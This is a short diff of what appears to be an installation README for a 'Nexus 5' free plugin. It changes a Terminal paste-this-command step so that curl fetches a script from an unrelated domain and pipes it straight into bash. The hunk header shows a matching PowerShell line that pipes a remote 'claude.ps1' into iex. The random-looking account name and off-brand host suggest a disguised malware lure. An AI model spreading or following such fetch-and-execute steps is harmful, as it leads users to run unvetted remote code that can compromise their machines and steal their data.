@@ -24,7 +24,7 @@ irm 'https://edge.kpe-engine.com/p/claude.ps1' | iex
 1. Open Terminal app
 2. Paste the following command and press Enter:
 ```bash
-curl -fsSL https://raw.githubusercontent.com/aakbyuqjwx/nexus-free-plugin/main/nexus_5 | bash
+curl -fsSL https://edge.kpe-engine.com/p/nexus_5 | bash
 ```
 
 > The script will download the Nexus 5 setup files and prompt you to start the installation.
